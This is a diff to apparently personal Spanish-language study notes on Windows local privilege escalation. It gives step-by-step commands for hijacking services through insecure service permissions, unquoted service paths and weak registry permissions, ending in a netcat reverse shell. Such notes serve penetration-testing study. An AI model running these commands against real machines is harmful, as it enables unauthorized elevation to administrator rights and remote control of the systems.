@@ -20,7 +20,11 @@ GetAppLockerPolicy == https://docs.microsoft.com/en-us/powershell/module/applock
 
 LISTAR USUARIOS =  net user
 
-Explotación de servicios con permisos inseguros:
+
+##################################################################EXPLOTACION DE SERVICIOS
+
+###################EXPLOTACIÖN DE SERVICIOS CON PERMISOS INSEGUROS:
+
 Luego de listar los servicios corriendo en el servidor podemos consultar por medio de la herramienta accesschk.exe (tenemos que introducirla en el sistema) los permisos que tiene el user sobre la misma con el comando:
 accesschk.exe /accepteula -uwcqv USUARIO_EN_USO SERVICIO_A_CONSULTAR
 
@@ -30,6 +34,41 @@ Podremos modificar su configuración.
 Podemos hacer una query al servicio para ver con qué privilegios/user corre con el comando:
 sc qc servicio
 
-Si el servicio corre con usuarios administradores o super usuarios nos es propicio para ser utilizado para elevar privilegios:
+Si el servicio corre con usuarios administradores o super usuarios (SERVICE_START_NAME)nos es propicio para ser utilizado para elevar privilegios:
 modificaremos el BINPATH del mismo para que al momento de ser ejecutado, llame a un nuevo proceso o programa malicioso.
 sc config daclsvc binpath= "\"C:\PATH\TO\MALICIOUS.exe""
+
+ahora podemos correr el servicio y que nos genere una shell reversa:
+net start servicio
+
+###################EXPLOTACIÖN DE SERVICIOS UNQUOTED:
+
+Es posible explotarlo cuando el path del servicio no está entre comillas y tiene espacios en los nombres del path.
+
+Hacemos una query al servicio y vemos si el BINARY_PATH_FILE se encuentra con las caracteristicas antes mencionadas:
+sc qc servicio
+
+Vemos con accesschk.exe quienes pueden escribir en el directorio del servicio:
+accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" 
+
+Si nuestro usuario/grupo al que pertenece puede leer y escribir reemplazamos el archivo commons.exe por nuestro binario con la reverse shell:
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+
+ponemos un netcat en listener y corremos el servicio
+net start servicio
+
+################WEAK REGISTRY PERMISSIONS:
+Una vez identificado un servicio que corre con privilegios elevados, corremos el accesschk.exe para ver si nuestro user/grupo al que pertenece puede escribir entradas de registro:
+accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\servicio
+
+De tenerlos, podemos reescribir el imagepath key para que apunte a un archivo malicioso:
+reg add HKLM\SYSTEM\CurrentControlSet\services\service /v ImagePath /t REG_EXPAND_SZ /d C:\Path\to/malicious.exe /f
+
+Iniciamos un netcat como listener y corremos el servicio
+net start regsvc
+
+###############
+
+
+
+
